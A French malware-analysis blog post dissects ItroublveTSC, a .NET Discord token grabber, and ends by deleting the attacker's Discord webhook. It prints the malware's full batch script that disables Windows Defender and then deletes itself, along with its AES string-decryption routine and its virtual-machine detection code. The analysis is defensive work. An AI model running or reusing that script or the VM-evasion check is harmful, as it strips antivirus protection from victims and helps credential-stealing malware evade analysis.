---
title: ItroublveTSC, un Token Grabber discord en .NET
date: 2024-12-31
categories: ['malware']
tags: ['.NET']
author: noderyos
---

## 1. Trouver un sample

En cherchant 30sec sur internet j'en ai trouvé un (sous le nom de VoltCrack).

## 2. Identifier le type de fichier

Pour ça j'utilise la commande `file` sous linux :

![](/assets/articles/itroublve/1.png)

On a donc un executable codé en .NET/C#, ce type d'executable est nommé un "Assembly" en réalité on peut le "décompiler" contrairement aux autres executables.

## 3. Analyse du Loader

Je vais utiliser l'outil [dnSpy](https://github.com/dnSpyEx/dnSpy) pour le décompiler (il existe aussi [IlSpy](https://github.com/icsharpcode/ILSpy)). Malheureusement il est obfusqué :

![](/assets/articles/itroublve/2.png)

Mais pas si grave, on va l'uploader sur [app.any.run](https://app.any.run/) pour voir si il envoie des requètes, et on obtient cette requète :

![](/assets/articles/itroublve/3.png)

J'ai beaucoup cherché sur internet car je ne m'attendais pas à le trouver sur github mais ducoup on trouve ça :

![](/assets/articles/itroublve/4.png)

## 4. Génération et analyse d'un sample

Super, maintenant on connait le nom du virus, j'ai donc téléchargé le programme et j'ai créé mon propre virus en desactivant l'obfuscateur, et bingo une fois decompilé on tombe sur du code lisible :

![](/assets/articles/itroublve/5.png)

Dans les ressources on y trouve plusieurs fichiers dont 3 importants:

`idk.Binaries.config` :

```json
{
    "cam": false,
    "files": false,
    "shutdown": false,
    "restart": false,
    "rd": false
}
```     

Visiblement ce que fait le virus (dans ce cas il ne fais pas de screenshot, il n'eteint pas le pc, ne le redemare pas et ne relance pas discord).

`idk.Binaries.whysosad` :

```batch
@echo off
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f´
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /fschtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
rem gg
del %0 /f /q
```      

Visiblement un script batch permettant de desactiver Windows Defender (De manière très mal faite).

et pour terminer : `idk.Binaries.RtkBtManServ.exe`

C'est un executable très important pour la suite.

## 5. Analyse du payload

Je relance ensuite la commande `file` sur RtkBtManServ.exe et bingo c'est un `Assembly .NET/C#`, je tente donc de le decompiler et cette fois ci il n'est pas obfusqué. Sur le screen d'au dessus on peut voir une variable nommée `arguments` et qui contient une chaine en base64 visiblement sauf que si je le dechifre je n'obtiens rien de lisible. 
Sauf que nous avons le code de RtkBtManServ, et après quelques minutes de renomage des variables on obtient :

```cs
public static void Main(string[] arg){
    try{
        byte[] bytes = Hook.AES128(Convert.FromBase64String(arg[0]));
        Hook._Santa = new Uri(Encoding.ASCII.GetString(bytes)).AbsoluteUri;
        Hook._Santa = Hook._Santa.Replace("%00", "");
    }catch{
        Hook._Santa = arg[0];
    }
}
public static byte[] AES128(byte[] message){
    byte[] result;
    try{
        result = new AesManaged {
            Key = new byte[]{88,105,179,95,179,135,116,246,101,235,150,231,111,77,22,131},
            IV = new byte[16],
            Mode = CipherMode.CBC,
            Padding = PaddingMode.Zeros
        }.CreateDecryptor().TransformFinalBlock(message, 0, message.Length);
    }
    catch{
        result = null;
    }
    return result;
}
```       

J'ai donc reproduit ce code sur [CyberChef](https://gchq.github.io/CyberChef/) pour voir ce que cela me donne (instance [ici](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)To_Hex('Space',0)AES_Decrypt(%7B'option':'Hex','string':'5869b35fb38774f665eb96e76f4d1683'%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cx00'%7D,'',true,false,false,false)&input=WmhYbDM5QmxoUDg0K1k0a3VyQTh3cGVoeHhxQTBYMjJJTVlaNlZwaXFzN0MvL2V4WlBSWWs0aWZ3OGg4OUtpdUNhSmlxZkh4YUxOQjFMY3Z1djlsTk1EV21xN2I4Wk9xR1VmWFY0WnpSMGNteTF4VWVIcUpacEhvcTh0OTBYZjdaeGZwKzRRNmIzdTA4RnE0MkY4bzh3WmpSVk9LbjJza0hscWl0S1M0RWtnPQ)) et j'obtiens ça :

![](/assets/articles/itroublve/6.png)

On a donc désormais un lien de webhook discord (Un webhook discord permet à un programme d'envoyer des messages sur discord de manière automatique). Mais malheureusement je ne peux pas récupérer les arguments passés au programme sur le sample qu'on est en train d'analyser :(, je fais donc ce que je sais faire de mieux, lancer le virus dans une machine virtuelle et utiliser Fiddler pour récupérer le lien du webhook, sauf que je fais face à une erreur, qui a première vue est une erreur .NET sauf que si on regarde le code du virus que j'ai généré moi on se rend compte que ce message a été volontairement affiché quand il détecte qu'il s'aggit d'une VM, qu'il verifie avec ce code (renommé et reformaté) :

```cs
using (ManagementObjectSearcher mOS = new ManagementObjectSearcher("Select * from Win32_ComputerSystem")) {
    using (ManagementObjectCollection mOC = mOS.Get()) {
        foreach (ManagementBaseObject mBO in mOC) {
            string manufacturerName = mBO["Manufacturer"].ToString().ToLower();
            if ((manufacturerName == "microsoft corporation" && mBO["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                    || manufacturerName.Contains("vmware")
                    || mBO["Model"].ToString().ToLower() == "virtualbox") {
                VMChecker.isVM = true;
                return;
            }
        }
    }
}
```

Pour contourner ça, il suffit d'ouvrir le .vmx de la VM (sous VMWare) et ajouter cette ligne : `SMBIOS.reflecthost = "TRUE"` afin de simuler l'ordinateur hôte et effectivement ça marche car je n'ai plus ce message d'erreur. Je retente donc de capturer les requètes http/https avec Fiddler et j'y arrive correctement. Il nous reste plus qu'a faire supprimer ce webhook pour que la personne qui a créé le virus ne puisse plus voler d'informations: Si on se réfère à la documentation de l'api de Discord il suffit d'enyoyer une requète de type `DELETE` sur l'URL trouvée. Je fais ça et le retour de la requète `GET` passe de ça

![](/assets/articles/itroublve/7.png)

à ça

![](/assets/articles/itroublve/8.png)

(je n'ai plus le lien exact du webhook donc je l'ai reproduit avec mon propre lien pour la démo)
